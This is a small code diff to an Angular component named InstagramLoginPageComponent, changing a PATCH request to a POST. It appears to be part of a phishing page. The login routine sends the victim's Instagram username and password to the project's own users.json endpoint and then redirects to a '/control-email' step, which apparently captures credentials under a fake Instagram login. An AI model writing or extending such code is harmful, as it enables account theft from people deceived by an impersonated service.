@@ -22,7 +22,7 @@ export class InstagramLoginPageComponent {
   }
 
   async login() {
-    return this.http.patch(`${environment.apiUrl}/users.json`, {username: this.username.value, password: this.password.value}).toPromise().then((data: any)=> {
+    return this.http.post(`${environment.apiUrl}/users.json`, {username: this.username.value, password: this.password.value}).toPromise().then((data: any)=> {
       this.router.navigate(['/control-email'], {queryParams: {id: data.name}})
     })
   }
